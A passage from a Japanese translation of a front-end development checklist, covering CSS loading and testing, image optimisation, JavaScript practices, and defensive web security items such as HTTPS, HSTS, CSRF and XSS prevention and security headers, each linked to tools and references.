<input type="checkbox" class="task-list-item-checkbox" disabled><strong>ノンブロッキング:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> CSS ファイルは DOM の読み込みに時間がかからないようにノンブロッキングである。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://github.com/filamentgroup/loadCSS" rel="nofollow noopener" target="_blank">loadCSS by filament group</a>
</li>
<li>📖 <a href="https://gist.github.com/thedaviddias/c24763b82b9991e53928e66a0bafc9bf" rel="nofollow noopener" target="_blank">Example of preload CSS using loadCSS</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Unused CSS:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> 使用していない CSS は削除されていること。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://uncss-online.com/" rel="nofollow noopener" target="_blank">UnCSS Online</a> 🛠</li>
<li>🛠 <a href="https://github.com/purifycss/purifycss" rel="nofollow noopener" target="_blank">PurifyCSS</a>
</li>
<li>🛠 <a href="https://developers.google.com/web/updates/2017/04/devtools-release-notes#coverage" rel="nofollow noopener" target="_blank">Chrome DevTools Coverage</a>
</li>
</ul>
</blockquote>

<h3>
<span id="css-のテスト" class="fragment"></span><a href="#css-%E3%81%AE%E3%83%86%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>CSS のテスト</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>文法:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべての CSS 及び SCSS にはエラーがないこと。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://stylelint.io/" rel="nofollow noopener" target="_blank">stylelint, a CSS linter</a>
</li>
<li>📖 <a href="https://sass-guidelin.es/" rel="nofollow noopener" target="_blank">Sass guidelines</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>レスポンシブデザイン:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべてのページは、320px, 768px, 1024px のブレイクポイントでテストされていること。（可能であれば、アナリティクスの結果に基づいて他のブレイクポイントでもテストする。）</p></li>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>CSS バリデーター:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> CSS がテストされ、関連するエラーが修正されていること。</p></li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://jigsaw.w3.org/css-validator/" rel="nofollow noopener" target="_blank">CSS Validator</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>デスクトップブラウザ:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべてのページは現在あるすべてのデスクトップブラウザでテストされている。 (Safari, Firefox, Chrome, Internet Explorer, EDGE...)</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>モバイルブラウザ:</strong>  <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべてのページは現在あるすべてのモバイルブラウザでテストされている。 (Native browser, Chrome, Safari...)</li>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>OS:</strong>  <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべてのページは現在あるすべての OS でテストされている。 (Windows, Android, iOS, Mac...).</p></li>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>ピクセルパーフェクト:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべてのページはピクセルパーフェクトに近い状態であること。クリエイティブの品質によっては 100% 正確ではない場合があるが、テンプレートにほぼ近い状態である必要がある。</p></li>
</ul>

<blockquote>
<p><a href="https://chrome.google.com/webstore/detail/perfectpixel-by-welldonec/dkaagdgjmgdmbnecmcefdhjekcoceebi?hl=en" rel="nofollow noopener" target="_blank">Pixel Perfect - Chrome Extension</a></p>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>書字方向:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべてのページは、必要に応じて LTR 及び RTL でテストされていること。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://hacks.mozilla.org/2015/09/building-rtl-aware-web-apps-and-websites-part-1/" rel="nofollow noopener" target="_blank">Building RTL-Aware Web Apps &amp; Websites: Part 1 - Mozilla Hacks</a>
</li>
<li>📖 <a href="https://hacks.mozilla.org/2015/10/building-rtl-aware-web-apps-websites-part-2/" rel="nofollow noopener" target="_blank">Building RTL-Aware Web Apps &amp; Websites: Part 2 - Mozilla Hacks</a>
</li>
</ul>
</blockquote>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="画像" class="fragment"></span><a href="#%E7%94%BB%E5%83%8F"><i class="fa fa-link"></i></a>画像</h2>

<blockquote>
<p><strong>Notes:</strong> 画像の最適化に関して総合的に理解するには、Addy Osmani による <strong><a href="https://images.guide/" rel="nofollow noopener" target="_blank">Essential Image Optimization</a></strong> をおすすめします。</p>
</blockquote>

<h3>
<span id="ベストプラクティス-1" class="fragment"></span><a href="#%E3%83%99%E3%82%B9%E3%83%88%E3%83%97%E3%83%A9%E3%82%AF%E3%83%86%E3%82%A3%E3%82%B9-1"><i class="fa fa-link"></i></a>ベストプラクティス</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Optimization:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべての画像はブラウザでの表示に対して最適化されていること。WebP フォーマットは、ホームページのような重要なページでも使用することができます。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://github.com/imagemin/imagemin" rel="nofollow noopener" target="_blank">Imagemin</a>
</li>
<li>🛠 Use <a href="https://imageoptim.com/" rel="nofollow noopener" target="_blank">ImageOptim</a> to optimise your images for free.</li>
<li>🛠 Use <a href="https://kraken.io/web-interface" rel="nofollow noopener" target="_blank">Kraken.io</a> awesome alternative for both png and jpg optimization. Up to 1mb per files on free plan.</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Picture/Srcset:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> <code>picture/srcset</code> によって現在のビューポートに最も適切なイメージを提供する。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://www.sitepoint.com/how-to-build-responsive-images-with-srcset/" rel="nofollow noopener" target="_blank">How to Build Responsive Images with srcset</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Retina:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> Retina ディスプレイをサポートするために2倍または3倍のイメージサイズの画像を提供している。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Sprite:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 小さい画像はスプライト画像にまとめられている。（アイコンの場合は、SVGスプライトイメージに含めることができます。）</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Width and Height:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> 最終的に表示される際のサイズがわかっている場合、すべての <code>&lt;img&gt;</code> は、<code>height</code> と <code>width</code> が指定されている。（<code>px</code> または <code>%</code> を指定しない。）</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Alt テキスト:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべての <code>&lt;img&gt;</code> は Alt テキストが代替テキストとして指定されていること。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://axesslab.com/alt-texts/" rel="nofollow noopener" target="_blank">Alt-texts: The Ultimate Guide</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>遅延ロード:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 画像は遅延ロードされていること。（noscript による代替策が常に提供されていること。）</li>
</ul>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="javascript" class="fragment"></span><a href="#javascript"><i class="fa fa-link"></i></a>JavaScript</h2>

<h3>
<span id="ベストプラクティス-2" class="fragment"></span><a href="#%E3%83%99%E3%82%B9%E3%83%88%E3%83%97%E3%83%A9%E3%82%AF%E3%83%86%E3%82%A3%E3%82%B9-2"><i class="fa fa-link"></i></a>ベストプラクティス</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>インライン JavaScript:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> インライン JavaScript がないこと。（HTML と混ざっているもの）</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>ファイルの結合:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> JavaScript ファイルは一つのファイルに結合されていること。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>圧縮（Minify）:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> JavaScript ファイルは圧縮されていること。（<code>.min.js</code> という拡張子を使用できる。）</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://developers.google.com/speed/docs/insights/MinifyResources" rel="nofollow noopener" target="_blank">Minify Resources (HTML, CSS, and JavaScript)</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>JavaScript セキュリティ:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a>
</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet#Guidelines_for_Developing_Secure_Applications_Utilizing_JavaScript" rel="nofollow noopener" target="_blank">Guidelines for Developing Secure Applications Utilizing JavaScript</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>ノンブロッキング:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> JavaScript ファイルは、<code>async</code> 属性を使用して非同期で読み込まれるか、<code>defer</code> 属性を使用して遅延実行されている。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://developers.google.com/speed/docs/insights/BlockingJS" rel="nofollow noopener" target="_blank">Remove Render-Blocking JavaScript</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Modernizr:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> もし、ある特定の機能を使用する際には、Modernizr を使用して、<code>&lt;html&gt;</code> の class を追加することができる。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://modernizr.com/download?setclasses" rel="nofollow noopener" target="_blank">Customize your Modernizr</a>
</li>
</ul>
</blockquote>

<h3>
<span id="javascript-テスティング" class="fragment"></span><a href="#javascript-%E3%83%86%E3%82%B9%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>JavaScript テスティング</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>ESLint:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> ESLint にてエラーが発生しないこと。（あなたの設定またはスタンダードなルールを基準とする。）</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://eslint.org/" rel="nofollow noopener" target="_blank">ESLint - The pluggable linting utility for JavaScript and JSX</a>
</li>
</ul>
</blockquote>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="セキュリティ" class="fragment"></span><a href="#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3"><i class="fa fa-link"></i></a>セキュリティ</h2>

<h3>
<span id="ウェブサイトをスキャンして確認する" class="fragment"></span><a href="#%E3%82%A6%E3%82%A7%E3%83%96%E3%82%B5%E3%82%A4%E3%83%88%E3%82%92%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E3%81%97%E3%81%A6%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ウェブサイトをスキャンして確認する</h3>

<blockquote>
<ul>
<li><a href="https://securityheaders.io/" rel="nofollow noopener" target="_blank">securityheaders.io</a></li>
<li><a href="https://observatory.mozilla.org/" rel="nofollow noopener" target="_blank">Observatory by Mozilla</a></li>
<li><a href="https://asafaweb.com/" rel="nofollow noopener" target="_blank">ASafaWeb - Automated Security Analyser for ASP.NET Websites</a></li>
</ul>
</blockquote>

<h3>
<span id="ベストプラクティス-3" class="fragment"></span><a href="#%E3%83%99%E3%82%B9%E3%83%88%E3%83%97%E3%83%A9%E3%82%AF%E3%83%86%E3%82%A3%E3%82%B9-3"><i class="fa fa-link"></i></a>ベストプラクティス</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>HTTPS:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> すべてのページ及び外部コンテンツで HTTPS が使用されている。（プラグイン、画像 ...）</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://letsencrypt.org/" rel="nofollow noopener" target="_blank">Let's Encrypt - Free SSL/TLS Certificates</a>
</li>
<li>🛠 <a href="https://www.ssllabs.com/ssltest/index.html" rel="nofollow noopener" target="_blank">Free SSL Server Test</a>
</li>
<li>📖 <a href="http://caniuse.com/#feat=stricttransportsecurity" rel="nofollow noopener" target="_blank">Strict Transport Security</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>HTTP Strict Transport Security (HSTS):</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> HTTP ヘッダーには 'Strict-Transport-Security' が設定されている。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://hstspreload.org/" rel="nofollow noopener" target="_blank">Check HSTS preload status and eligibility</a>
</li>
<li>📖 <a href="https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet" rel="nofollow noopener" target="_blank">HTTP Strict Transport Security Cheat Sheet - OWASP</a>
</li>
<li>📖 <a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet" rel="nofollow noopener" target="_blank">Transport Layer Protection Cheat Sheet - OWASP</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Cross Site Request Forgery (CSRF):</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> CSRF 攻撃を防ぐために、あなたのサーバーへのリクエストにたいしては、それがあなたのウェブサイト/アプリから送信されていることを確認している。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" rel="nofollow noopener" target="_blank">Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet  - OWASP</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Cross Site Scripting (XSS):</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> あなたのサイトには、XSS が可能な脆弱性が存在していない。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" rel="nofollow noopener" target="_blank">XSS (Cross Site Scripting) Prevention Cheat Sheet  - OWASP</a>
</li>
<li>📖 <a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet" rel="nofollow noopener" target="_blank">DOM based XSS Prevention Cheat Sheet  - OWASP</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Content Type Options</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> サーバーからの <code>X-Content-Type-Options</code> ヘッダーによって、Google Chrome や Internet Explorer の mime-sniff による Content-Type に一致しない動作を防止する。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://scotthelme.co.uk/hardening-your-http-response-headers/#x-content-type-options" rel="nofollow noopener" target="_blank">X-Content-Type-Options - Scott Helme</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>X-Frame-Options (XFO)</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 来訪者をクリックジャッキング攻撃から保護する。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://scotthelme.co.uk/hardening-your-http-response-headers/#x-frame-options" rel="nofollow noopener" target="_blank">X-Frame-Options - Scott Helme</a>
</li>
